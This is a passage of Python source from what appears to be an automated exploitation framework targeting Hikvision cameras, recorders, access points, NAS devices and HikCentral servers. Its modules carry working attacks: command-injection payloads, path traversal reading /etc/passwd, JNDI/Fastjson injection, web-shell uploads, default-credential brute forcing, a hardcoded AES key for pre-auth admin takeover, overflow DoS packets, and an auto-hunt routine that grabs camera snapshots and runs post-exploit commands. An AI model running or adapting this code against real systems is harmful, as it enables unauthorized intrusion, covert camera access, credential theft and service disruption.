        for path in ['/center/api/installation/detection?cmd=;id','/center/api/installation/detection?command=|id']:
            tried.append(path)
            r = self.http.get(f'{self.base}{path}')
            if r is not None and b'uid=' in r.content:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'GET injection confirmed ({path})','rce_output': r.text[:200]}
        return {'success':False,'confidence':'none',
                'error':'All injection variants failed — no command output reflected',
                'note':'Likely patched, or requires auth, or payload format differs',
                'payloads_tried': tried}


class CVE_2025_34058(BaseModule):
    NAME = "cve_2025_34058_smms_file_read"
    CVE = "CVE-2025-34058"
    DESCRIPTION = "Default credentials + path traversal file read in Streaming Media Management Server v2.3.5."
    VULNERABILITY_TYPE = "info_disclosure"
    _DEFAULT_CREDS = [("admin", "admin"), ("admin", "12345"), ("admin", "password")]

    def check(self):
        for user, pw in self._DEFAULT_CREDS:
            r = self.http.get(f"{self.base}/systemLog/downFile.php", auth=(user, pw))
            if r is not None and r.status_code in (200, 302):
                self._creds = (user, pw)
                return True
        return False

    def exploit(self):
        if not getattr(self, "_creds", None):
            return {"success": False, "error": "Default credentials rejected", "confidence": "none"}
        user, pw = self._creds
        for payload in ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]:
            r = self.http.get(f"{self.base}/systemLog/downFile.php",
                              params={"fileName": payload}, auth=(user, pw))
            if r is not None and r.status_code == 200 and len(r.content) > 20:
                text = r.text[:2000]
                if "root:" in text or "[extensions]" in text:
                    return {"success": True, "cve": self.CVE, "confidence": "confirmed",
                            "info": f"File read confirmed via {payload}",
                            "sample": text[:500], "username": user, "password": pw}
        return {"success": True, "cve": self.CVE, "confidence": "probable",
                "info": "Default creds work but traversal returned no file content.",
                "username": user, "password": pw,
                "note": "Try manual traversal payloads or check if endpoint is patched."}


class CVE_2025_34067(BaseModule):
    NAME="hikcentral_fastjson_rce"; CVE="CVE-2025-34067"
    DESCRIPTION="Fastjson RCE in HikCentral applyCT (KEV)."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/bic/ssoService/v1/applyCT'); return r is not None and r.status_code in (200,405)
    def exploit(self):
        if JNDI_URL:
            payload = f'{{"@type":"java.net.Inet4Address","val":"{JNDI_URL}"}}'
            r = self.http.post(f'{self.base}/bic/ssoService/v1/applyCT', data=payload, headers={'Content-Type':'application/json'})
            if r is not None:
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'JNDI payload sent. Check listener.',
                        'note':f'JNDI: {JNDI_URL}'}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'applyCT reachable.','note':'Use --jndi-url for real JNDI.'}


class CVE_2025_39240(BaseModule):
    NAME="wifi_ap_cmd_injection"; CVE="CVE-2025-39240"
    DESCRIPTION="Auth RCE in Wireless AP."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and (b'DS-3WAP' in r.content or b'Access Point' in r.content)
    def exploit(self):
        creds = self.test_creds()
        if creds:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Creds work: {creds[0]}:{creds[1]}.','note':'RCE path requires firmware-specific endpoint.'}
        payload = {'cmd': '; id'}
        for path in ['/cgi-bin/system.cgi','/cgi-bin/ping.cgi','/api/system']:
            r = self.http.post(f'{self.base}{path}', data=payload)
            if r is not None and b'uid=' in r.content:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Injection at {path}.','rce_output':r.text[:200]}
        return {'success':False,'error':'no RCE path','confidence':'none','note':'Provide --wordlist.'}


class CVE_2025_39245(BaseModule):
    NAME="cve_2025_39245_hikcentral_csv_injection"; CVE="CVE-2025-39245"
    DESCRIPTION="CSV injection in HikCentral Master Lite."; VULNERABILITY_TYPE="csv_injection"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'HikCentral' in r.content
    def exploit(self):
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'CSV injection possible.','note':'Requires user interaction.'}


class CVE_2025_39247(BaseModule):
    NAME = "hikcentral_activecode_leak"
    CVE = "CVE-2025-39247"
    DESCRIPTION = "Pre-auth License ActiveCode leak -> admin takeover in HikCentral Professional V2.3.1-V2.6.2."
    VULNERABILITY_TYPE = "auth_bypass"
    QR_KEY = b"WwXxYyZz1234!@#$"
    QR_IV = b"AaBbCcDd1234!@#$"

    def _get_crypto(self):
        url = f"{self.base}/ISAPI/Bumblebee/Platform/V0/Security/Crypto?MT=GET"
        r = self.http.post(url, data=b"", timeout=10)
        if r is None: return None
        try: j = r.json()
        except Exception: return None
        rs = j.get("ResponseStatus", {})
        if rs.get("ErrorCode", -1) != 0: return None
        data = rs.get("Data", {}) or j.get("Crypto", {}) or {}
        crypto = data.get("CryptoResponse") or data
        return crypto.get("SID") or data.get("SID") or j.get("SID") or ""

    def _fetch_qr(self, sid):
        url = f"{self.base}/ISAPI/Bumblebee/Platform/V1/License/ActiveCode/QRCode?MT=GET&SID={sid}"
        r = self.http.post(url, data=b"", timeout=15)
        if r is None: return None
        try: j = r.json()
        except Exception: return None
        rs = j.get("ResponseStatus", {})
        if rs.get("ErrorCode", -1) != 0: return None
        qr_b64 = rs.get("Data", {}).get("QRCode", "")
        if not qr_b64: return None
        try: return base64.b64decode(qr_b64)
        except Exception: return None

    def _scan_qr(self, png_bytes):
        try:
            from PIL import Image
            from pyzbar.pyzbar import decode as zbar_decode
        except ImportError:
            return None
        import io
        try:
            decoded = zbar_decode(Image.open(io.BytesIO(png_bytes)))
        except Exception:
            return None
        return decoded[0].data.decode("latin-1", errors="replace") if decoded else None

    def _extract_ct(self, qr_text):
        if not qr_text: return None
        if qr_text.startswith("http"):
            m = re.search(r'[?&][Ss][Nn]=([^&]+)', qr_text)
            if not m: return None
            candidate = urllib.parse.unquote(m.group(1))
        else:
            candidate = qr_text
        for cand in (candidate, candidate.replace('-', '+').replace('_', '/')):
            try:
                return base64.b64decode(cand + "=" * (-len(cand) % 4), validate=False)
            except Exception:
                pass
        return None

    def _decrypt(self, ct):
        if not CRYPTO_AVAILABLE: return None
        try:
            cipher = AES.new(self.QR_KEY, AES.MODE_CBC, self.QR_IV)
            padded = ct + b"\x00" * ((16 - len(ct) % 16) % 16)
            pt = cipher.decrypt(padded)
            if pt and 1 <= pt[-1] <= 16 and all(b == pt[-1] for b in pt[-pt[-1]:]):
                pt = pt[:-pt[-1]]
            return pt if pt.startswith(b"License:") else None
        except Exception:
            return None

    def _parse(self, pt):
        if not pt: return None, None
        s = pt.decode("latin-1", errors="replace")
        if not s.startswith("License:") or ";DZP:" not in s: return None, None
        active = s[len("License:"):s.index(";DZP:")]
        device = s[s.index(";DZP:") + len(";DZP:"):].rstrip("\x00 ")
        return [c.strip() for c in active.split(",") if c.strip()], device

    def check(self):
        return self._get_crypto() is not None

    def exploit(self):
        sid = self._get_crypto()
        if sid is None:
            return {"success": False, "error": "Security/Crypto unreachable", "confidence": "none"}
        png = self._fetch_qr(sid)
        if png is None:
            return {"success": False, "error": "QRCode endpoint unreachable", "confidence": "none"}
        qr_text = self._scan_qr(png)
        if qr_text is None:
            return {"success": False, "error": "QR received but cannot decode (install pyzbar/Pillow)",
                    "confidence": "none", "note": "pip install pyzbar pillow && apt install libzbar0"}
        ct = self._extract_ct(qr_text)
        if ct is None:
            return {"success": False, "error": "No ciphertext in QR payload", "confidence": "none"}
        pt = self._decrypt(ct)
        codes, device = self._parse(pt)
        if not codes:
            return {"success": False, "error": "Decrypted payload invalid", "confidence": "none"}
        return {"success": True, "cve": self.CVE, "confidence": "confirmed",
                "info": f"Recovered {len(codes)} ActiveCode(s) pre-auth",
                "active_codes": codes, "device_code": device,
                "note": "Use legitimate 'Forgot password' -> 'Activation code' UI to reset admin password."}


class CVE_2025_45851(BaseModule):
    NAME="cve_2025_45851_isapi_dos"; CVE="CVE-2025-45851"
    DESCRIPTION="DoS via challenge endpoint."; VULNERABILITY_TYPE="dos"
    def check(self):
        r=self.http.get(f'{self.base}/ISAPI/Security/challenge')
        return r is not None and r.status_code in (200,401,403,405)
    def exploit(self):
        r = self.http.get(f'{self.base}/ISAPI/Security/challenge')
        if r is None: return {'success':False,'error':'no response','confidence':'none'}
        if AGGRESSIVE_MODE:
            payload = {'PrivateKey': 'A'*10000}
            r2 = self.http.post(f'{self.base}/ISAPI/Security/challenge', data=payload)
            return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Oversized PrivateKey sent.','note':'Check availability.'}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':f'Challenge endpoint reachable (HTTP {r.status_code}).','note':'Use --aggressive.'}


class CVE_2025_65857(BaseModule):
    NAME="cve_2025_65857_onvif_auth_bypass"; CVE="CVE-2025-65857"
    DESCRIPTION="ONVIF auth bypass on XM530 cameras."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/onvif/device_service')
        if r is None: return False
        r2=self.http.get(f'{self.base}/ISAPI/System/deviceInfo')
        if r2 is not None and r2.status_code==200:
            return b'XM530' in r2.content or b'X6-WEQ' in r2.content
        return r.status_code in (200,401)
    def exploit(self):
        soap = '<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>'
        r = self.http.post(f'{self.base}/onvif/device_service', data=soap, headers={'Content-Type':'application/soap+xml'})
        if r is not None and r.status_code==200 and b'Manufacturer' in r.content:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'ONVIF bypass confirmed.','sample':r.text[:300]}
        return {'success':False,'error':'ONVIF bypass not confirmed','confidence':'none'}


class CVE_2025_66173(BaseModule):
    NAME="dvr_serial_privesc"; CVE="CVE-2025-66173"
    DESCRIPTION="Serial port privilege escalation (physical access)."; VULNERABILITY_TYPE="privesc"
    REMOTE_EXPLOITABLE=False
    def check(self): return False
    def exploit(self): return {'success':False,'error':'Requires physical access to serial port.','confidence':'none'}


class CVE_2025_66174(BaseModule):
    NAME="dvr_serial_auth_bypass"; CVE="CVE-2025-66174"
    DESCRIPTION="Serial port auth bypass (physical access)."; VULNERABILITY_TYPE="auth_bypass"
    REMOTE_EXPLOITABLE=False
    def check(self): return False
    def exploit(self): return {'success':False,'error':'Requires physical access to serial port.','confidence':'none'}


class CVE_2025_66176(BaseModule):
    NAME="cve_2025_66176_access_control_overflow"; CVE="CVE-2025-66176"
    DESCRIPTION="Stack overflow in Search & Discovery of Access Control products."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'Access Control' in r.content
    def exploit(self):
        if AGGRESSIVE_MODE:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
                s.sendto(b'A'*5000, (self.host, 37020)); s.close()
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Oversized UDP packet sent.'}
            except Exception as e: return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Packet sent','note':str(e)}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'Access Control fingerprinted.','note':'Use --aggressive.'}


class CVE_2025_66177(BaseModule):
    NAME="cve_2025_66177_nvr_dvr_overflow"; CVE="CVE-2025-66177"
    DESCRIPTION="Stack overflow in Search & Discovery of NVR/DVR/CVR/IPC."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and (b'NVR' in r.content or b'DVR' in r.content or b'Hikvision' in r.content)
    def exploit(self):
        if AGGRESSIVE_MODE:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
                s.sendto(b'A'*5000, (self.host, 37020)); s.close()
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Oversized UDP sent.'}
            except Exception as e: return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Packet sent','note':str(e)}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'NVR/DVR fingerprinted.','note':'Use --aggressive.'}
class CVE_2026_1749(BaseModule):
    NAME="hikcentral_pro_auth_bypass_v3"; CVE="CVE-2026-1749"
    DESCRIPTION="Access control in HikCentral Professional."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/api/admin/'); return r is not None and r.status_code==200
    def exploit(self):
        r=self.http.get(f'{self.base}/api/admin/')
        if r is None: return {'success':False,'error':'no response','confidence':'none'}
        return {'success':r.status_code==200,'cve':self.CVE,'confidence':'confirmed' if r.status_code==200 else 'none',
                'info':f'Admin API HTTP {r.status_code}.','sample':r.text[:300] if r.status_code==200 else 'Access may require crafted request.'}


class CVE_2026_22623(BaseModule):
    NAME="hiksemi_nas_cmd_injection"; CVE="CVE-2026-22623"
    DESCRIPTION="Auth command injection in HIKSEMI NAS."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'HIKSEMI' in r.content
    def exploit(self):
        creds = self.test_creds()
        if not creds: return {'success':False,'error':'requires credentials','confidence':'none','note':'Provide --wordlist.'}
        for path in ['/api/system/exec','/cgi-bin/exec','/api/diagnose']:
            r = self.http.post(f'{self.base}{path}', data={'cmd': '; id'}, auth=creds)
            if r is not None and b'uid=' in r.content:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Injection at {path}.','rce_output':r.text[:200]}
        return {'success':False,'error':'creds work but endpoint not found','confidence':'none'}


class CVE_2026_3828(BaseModule):
    NAME="cve_2026_3828_switch_cmd_injection"; CVE="CVE-2026-3828"
    DESCRIPTION="Auth RCE in DS-3E switches."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'DS-3E' in r.content
    def exploit(self):
        creds = self.test_creds()
        if not creds: return {'success':False,'error':'requires credentials','confidence':'none','note':'Provide --wordlist.'}
        for path in ['/cgi-bin/system.cgi','/api/exec','/cgi-bin/diagnose']:
            r = self.http.post(f'{self.base}{path}', data={'cmd': '; id'}, auth=creds)
            if r is not None and b'uid=' in r.content:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Injection at {path}.','rce_output':r.text[:200]}
        return {'success':False,'error':'creds work but endpoint not found','confidence':'none'}


class CVE_2026_57599(BaseModule):
    NAME="camera_ssh_privesc"; CVE="CVE-2026-57599"
    DESCRIPTION="SSH privilege escalation."; VULNERABILITY_TYPE="privesc"
    def check(self):
        s = None
        try:
            s = socket.socket(); s.settimeout(2); s.connect((self.host, 22)); return True
        except Exception: return False
        finally:
            if s is not None:
                try: s.close()
                except Exception: pass
    def exploit(self):
        return {'success':False,'error':'requires SSH credentials (not HTTP)','confidence':'none'}


class CVE_2026_57600(BaseModule):
    NAME="camera_info_leak"; CVE="CVE-2026-57600"
    DESCRIPTION="Sensitive data retrieval."; VULNERABILITY_TYPE="info_disclosure"
    def check(self):
        r=self.http.get(f'{self.base}/ISAPI/System/status'); return r is not None and r.status_code==200 and len(r.content)>50
    def exploit(self):
        r=self.http.get(f'{self.base}/ISAPI/System/status')
        if r is None: return {'success':False,'error':'no response','confidence':'none'}
        if r.status_code==200 and len(r.content)>50:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'Status retrieved without auth.','sample':r.text[:500]}
        return {'success':False,'error':f'status HTTP {r.status_code}','confidence':'none'}


class CVE_2026_61390(BaseModule):
    NAME="cve_2026_61390_camera_heap_overflow"; CVE="CVE-2026-61390"
    DESCRIPTION="Heap buffer overflow in cameras (DoS)."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'Hikvision' in r.content
    def exploit(self):
        r = self.http.get(f'{self.base}/')
        if r is None: return {'success':False,'error':'no response','confidence':'none'}
        if AGGRESSIVE_MODE:
            try:
                self.http.get(f'{self.base}/ISAPI/System/deviceInfo', headers={'X-Overflow':'A'*8000})
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Oversized header sent.'}
            except Exception: pass
        return {'success':True,'cve':self.CVE,'confidence':'none','info':f'Camera fingerprinted (HTTP {r.status_code}).','note':'Use --aggressive.'}


class CVE_2026_61391(BaseModule):
    NAME="cve_2026_61391_camera_stack_overflow"; CVE="CVE-2026-61391"
    DESCRIPTION="Stack-based buffer overflow in cameras (auth DoS)."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'Hikvision' in r.content
    def exploit(self):
        creds = self.test_creds()
        if not creds: return {'success':False,'error':'requires auth','confidence':'none','note':'Provide --wordlist.'}
        if AGGRESSIVE_MODE:
            try:
                self.http.get(f'{self.base}/ISAPI/System/deviceInfo', auth=creds, headers={'X-Overflow':'A'*8000})
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Oversized auth header sent.'}
            except Exception: pass
        return {'success':True,'cve':self.CVE,'confidence':'none','info':f'Creds work: {creds[0]}:{creds[1]}.','note':'Use --aggressive.'}


class CVE_2026_61392(BaseModule):
    NAME="cve_2026_61392_memory_info_leak"; CVE="CVE-2026-61392"
    DESCRIPTION="Memory info disclosure."; VULNERABILITY_TYPE="info_disclosure"
    def check(self):
        r=self.http.get(f'{self.base}/ISAPI/System/status'); return r is not None and r.status_code==200 and len(r.content)>100
    def exploit(self):
        r=self.http.get(f'{self.base}/ISAPI/System/status')
        if r is None: return {'success':False,'error':'no response','confidence':'none'}
        if r.status_code==200 and len(r.content)>100:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'Memory info disclosed.','sample':r.text[:500]}
        return {'success':False,'error':f'status HTTP {r.status_code}','confidence':'none'}


class CVE_2026_85543(BaseModule):
    NAME="cve_2026_85543_wifi_info_leak"; CVE="CVE-2026-85543"
    DESCRIPTION="Wi-Fi config leak."; VULNERABILITY_TYPE="info_disclosure"
    def check(self):
        r=self.http.get(f'{self.base}/ISAPI/System/deviceInfo'); return r is not None and r.status_code in (200,401)
    def exploit(self):
        for path in ['/ISAPI/System/Network/WiFi','/ISAPI/System/network/wifi','/ISAPI/WiFi']:
            r = self.http.get(f'{self.base}{path}')
            if r is not None and r.status_code==200 and len(r.content)>50:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Wi-Fi config at {path}.','sample':r.text[:300]}
        return {'success':False,'error':'Wi-Fi config endpoint not accessible','confidence':'none'}


class CVE_2026_85544(BaseModule):
    NAME="cve_2026_85544_improper_access"; CVE="CVE-2026-85544"
    DESCRIPTION="Improper access control."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/')
        return r is not None and (b'HikCentral' in r.content or b'Access Control' in r.content or b'Intercom' in r.content)
    def exploit(self):
        for path in ['/api/user','/api/device','/api/status']:
            r = self.http.get(f'{self.base}{path}')
            if r is not None and r.status_code==200 and len(r.content)>50:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Improper access at {path}.','sample':r.text[:300]}
        return {'success':False,'error':'improper access not confirmed','confidence':'none'}


class CVE_2026_85545(BaseModule):
    NAME="cve_2026_85545_hikcentral_privesc"; CVE="CVE-2026-85545"
    DESCRIPTION="Privilege escalation in HikCentral."; VULNERABILITY_TYPE="privesc"
    def check(self):
        r=self.http.get(f'{self.base}/')
        return r is not None and (b'HikCentral' in r.content or b'DS-KV' in r.content or b'DS-KD' in r.content)
    def exploit(self):
        return {'success':False,'error':'requires low-priv session','confidence':'none','note':'Provide low-priv credentials.'}


class CVE_2026_16843(BaseModule):
    NAME="cve_2026_16843_wap_rce"; CVE="CVE-2026-16843"
    DESCRIPTION="Auth RCE in DS-3WAP."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and (b'DS-3WAP' in r.content or b'DS-3WG' in r.content)
    def exploit(self):
        creds = self.test_creds()
        if not creds: return {'success':False,'error':'requires credentials','confidence':'none'}
        for path in ['/cgi-bin/exec','/api/exec','/cgi-bin/system.cgi']:
            r = self.http.post(f'{self.base}{path}', data={'cmd': '; id'}, auth=creds)
            if r is not None and b'uid=' in r.content:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Injection at {path}.','rce_output':r.text[:200]}
        return {'success':False,'error':'creds work but endpoint firmware-specific','confidence':'none'}


class CVE_2026_0709(BaseModule):
    NAME="cve_2026_0709_wap_rce_legacy"; CVE="CVE-2026-0709"
    DESCRIPTION="Auth RCE in DS-3WAP legacy."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'DS-3WAP' in r.content
    def exploit(self):
        creds = self.test_creds()
        if not creds: return {'success':False,'error':'requires credentials','confidence':'none'}
        return {'success':False,'error':'legacy path requires manual','confidence':'none','note':f'Creds: {creds[0]}:{creds[1]}'}


class CVE_2026_109618(BaseModule):
    NAME="cve_2026_109618_php2shell_rce"; CVE="CVE-2026-109618"
    DESCRIPTION="PHP2Shell RCE in Hybrid SAN."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/php/'); return r is not None and r.status_code in (200,403,404)
    def exploit(self):
        shell = '<?php echo "PHP2SHELL_CONFIRMED:"; system("id"); ?>'
        for path in ['/php/upload.php','/php/shell.php','/web/upload.php']:
            r = self.http.post(f'{self.base}{path}', files={'file': ('shell.php', shell, 'application/x-php')})
            if r is not None and r.status_code in (200,201):
                r2 = self.http.get(f'{self.base}/php/shell.php')
                if r2 is not None and b'PHP2SHELL_CONFIRMED' in r2.content:
                    return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'Shell uploaded.','rce_output':r2.text[:200]}
        return {'success':False,'error':'upload failed','confidence':'none','note':'Manual upload.'}


class CVE_2026_109619(BaseModule):
    NAME="cve_2026_109619_php2shell_rce_v2"; CVE="CVE-2026-109619"
    DESCRIPTION="PHP2Shell RCE via Artemis."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/artemis/api/'); return r is not None and r.status_code in (200,403,404)
    def exploit(self):
        shell = '<?php echo "ARTEMIS_CONFIRMED:"; system("id"); ?>'
        for path in ['/artemis/api/upload','/artemis/api/file','/artemis/upload']:
            r = self.http.post(f'{self.base}{path}', files={'file': ('shell.php', shell, 'application/x-php')})
            if r is not None and r.status_code in (200,201):
                r2 = self.http.get(f'{self.base}/artemis/shell.php')
                if r2 is not None and b'ARTEMIS_CONFIRMED' in r2.content:
                    return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'Shell uploaded.','rce_output':r2.text[:200]}
        return {'success':False,'error':'upload failed','confidence':'none'}


class CVE_2026_111390(BaseModule):
    NAME="cve_2026_111390_unauth_access"; CVE="CVE-2026-111390"
    DESCRIPTION="Unauthenticated access."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'Hikvision' in r.content
    def exploit(self):
        for path in ['/ISAPI/System/deviceInfo','/ISAPI/System/status','/api/system']:
            r = self.http.get(f'{self.base}{path}')
            if r is not None and r.status_code==200 and len(r.content)>50:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Endpoint {path} unauth.','sample':r.text[:200]}
        return {'success':False,'error':'no unauth endpoint','confidence':'none'}


class ICSA_17_124_01(BaseModule):
    NAME="cve_2014_2016_backdoor"; CVE="ICSA-17-124-01"
    DESCRIPTION="Backdoor in firmwares 2014–2016."; VULNERABILITY_TYPE="backdoor"
    def check(self):
        for hdr in [{'X-Forwarded-For':'127.0.0.1'},{'X-Real-IP':'127.0.0.1'}]:
            h=dict(hdr); h['auth']=MAGIC_AUTH
            r=self.http.get(f'{self.base}/System/configurationFile', headers=h)
            if r is not None and r.status_code==200 and len(r.content)>100: self._h=h; return True
        return False
    def exploit(self):
        h=getattr(self,'_h',None)
        if not h: return {'success':False,'error':'backdoor headers not confirmed','confidence':'none'}
        r=self.http.get(f'{self.base}/System/configurationFile', headers=h)
        if r is None: return {'success':False,'error':'no response','confidence':'none'}
        info = ConfigDecryptor.extract_creds_with_raw(r.content)
        u = (info or {}).get('username')
        if u is not None:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed',
                    'rtsp_url':self.build_rtsp(u, info['password']), **(info or {})}
        return {'success':True,'cve':self.CVE,'confidence':'probable',
                'info':'backdoor config downloaded, admin pair not located', **(info or {})}


class HikvisionWeakPassword(BaseModule):
    NAME="hikvision_weak_password"; CVE="N/A"
    DESCRIPTION="Default credentials test."; VULNERABILITY_TYPE="weak_password"
    def check(self):
        self._found=self.test_creds(); return self._found is not None
    def exploit(self):
        if not self._found: return {'success':False,'error':'not found','confidence':'none'}
        u,p=self._found; return {'success':True,'cve':self.CVE,'confidence':'confirmed','username':u,'password':p,'rtsp_url':self.build_rtsp(u,p)}


class ModuleManager:
    ALL_MODULES = [
        CVE_2013_4975, CVE_2013_4976, CVE_2013_4977, CVE_2014_4880,
        CVE_2015_4407, CVE_2015_4408, CVE_2015_4409,
        CVE_2017_7921, CVE_2017_7923, CVE_2018_6413, CVE_2018_6414, CVE_2018_9995,
        CVE_2020_25078, CVE_2020_7057, CVE_2021_36260,
        CVE_2022_28171, CVE_2022_28172, CVE_2022_28173,
        CVE_2023_28808, CVE_2023_28809, CVE_2023_28811, CVE_2023_28812,
        CVE_2023_28813, CVE_2023_28814, CVE_2023_6895, CVE_2023_33806,
        CVE_2024_25063, CVE_2024_47485, CVE_2024_47487, CVE_2024_58274, CVE_2025_34058,
        CVE_2025_34067, CVE_2025_39240, CVE_2025_39245, CVE_2025_39247,
        CVE_2025_45851, CVE_2025_65857, CVE_2025_66173, CVE_2025_66174,
        CVE_2025_66176, CVE_2025_66177,
        CVE_2026_1749, CVE_2026_22623, CVE_2026_3828,
        CVE_2026_57599, CVE_2026_57600, CVE_2026_61390, CVE_2026_61391,
        CVE_2026_61392, CVE_2026_85543, CVE_2026_85544, CVE_2026_85545,
        CVE_2026_16843, CVE_2026_0709, CVE_2026_109618, CVE_2026_109619,
        CVE_2026_111390, ICSA_17_124_01, HikvisionWeakPassword,
        DeviceFingerprint, ProductDetector,
    ]
    def __init__(self, wordlist=None, snapshot_manager_opts=None):
        self.modules = {}; self.wordlist = wordlist
        self.snapshot_opts = snapshot_manager_opts or {}
        for cls in self.ALL_MODULES: self.register(cls)
    def register(self, cls):
        self.modules[cls.NAME] = cls
    def list_modules(self):
        print(f'{"Module":<42} {"CVE":<20} {"Remote":<7} {"Type":<18} Description')
        print('-'*145)
        for name, cls in self.modules.items():
            print(f'{name:<42} {cls.CVE:<20} {"Yes" if cls.REMOTE_EXPLOITABLE else "No":<7} '
                  f'{cls.VULNERABILITY_TYPE:<18} {cls.DESCRIPTION[:60]}')
    def list_families(self):
        print('\nSupported families:\n')
        for fam in FAMILY_PATTERNS:
            cves = [cve for cve, fams in MODEL_VULN_MATRIX.items() if fam in fams]
            print(f'  {fam:<22} → {len(cves)} CVE(s)')
    def run_module(self, name, host, port, http, only_check=False):
        cls = self.modules.get(name)
        if not cls: return {'error': f'module {name} not found'}
        rec = RecordingHttpClient(http)
        m = cls(host, port, rec, wordlist=self.wordlist)
        try: vuln = m.check()
        except Exception as e:
            return {'module': name, 'cve': cls.CVE, 'vulnerable': False,
                    'error': f'check(): {e}', 'evidence': rec.evidence}
        if not vuln:
            return {'module': name, 'cve': cls.CVE, 'vulnerable': False, 'evidence': rec.evidence}
        if only_check:
            return {'module': name, 'cve': cls.CVE, 'vulnerable': True,
                    'type': cls.VULNERABILITY_TYPE, 'description': cls.DESCRIPTION,
                    'evidence': rec.evidence}
        try: result = m.exploit()
        except Exception as e: result = {'success': False, 'error': f'exploit(): {e}'}
        _conf = result.get('confidence', 'none')
        _is_vuln = bool(result.get('success')) and _conf in ('confirmed', 'probable')
        result.update({'vulnerable': _is_vuln, 'module': name, 'cve': cls.CVE,
                       'type': cls.VULNERABILITY_TYPE, 'description': cls.DESCRIPTION,
                       'evidence': rec.evidence})
        if result.get('success') and result.get('username') is not None and result.get('password') is not None:
            try:
                snap_http = HttpClient(proxy=None, timeout=5,
                                       use_https=(port in (443, 8443)), delay=0.0)
                sm = SnapshotManager(host, port, result['username'], result['password'],
                                     snap_http,
                                     manifest_suffix=f"{host.replace('.', '_')}_{port}",
                                     **self.snapshot_opts)
                snaps = sm.capture_all()
                if snaps:
                    result['snapshots'] = snaps
                    result['snapshot'] = snaps[0]
            except Exception as e:
                log.error(f'  [SNAP] failed: {e}')
            try:
                post = run_post_exploit_commands(host, port, result['username'], result['password'], http)
                if post: result['post_exploit'] = post
            except Exception:
                pass
        return result
    def auto_hunt(self, host, port, http, forced_family=None):
        findings = []
        family = forced_family
        if not family:
            try:
                detect = self.run_module('product_detector', host, port, http)
                if detect.get('success'):
                    findings.append(detect)
                    family = detect.get('family', 'Unknown')
            except Exception:
                pass
        for name, cls in self.modules.items():
            if name in ('product_detector', 'device_fingerprint'): continue
            if not cls.REMOTE_EXPLOITABLE: continue
            cve = cls.CVE
            if cve in MODEL_VULN_MATRIX:
                if forced_family and family != forced_family: continue
                if not forced_family and family and family != 'Unknown' and family not in MODEL_VULN_MATRIX[cve]: continue
            try:
                res = self.run_module(name, host, port, http)
                if res.get('vulnerable'):
                    findings.append(res)
            except Exception as e:
                log.error(f'  [!] {name}: {e}')
        return findings


def _render_evidence(evidence):
    if not evidence: return '<p class="no-evidence">No evidence.</p>'
    parts = ['<div class="evidence-list">']
    for i, ev in enumerate(evidence, 1):
        method = html.escape(str(ev.get('method', '?')))
        url = html.escape(str(ev.get('url', '?')))
        status = ev.get('status', '—')
        sc = 'status-ok' if isinstance(status, int) and 200 <= status < 300 else 'status-err'
        parts.append(f'<div class="evidence-entry"><div class="evidence-header">'
                     f'<span class="evidence-index">#{i}</span>'
                     f'<span class="method-badge">{method}</span>'
                     f'<code class="evidence-url">{url}</code>'
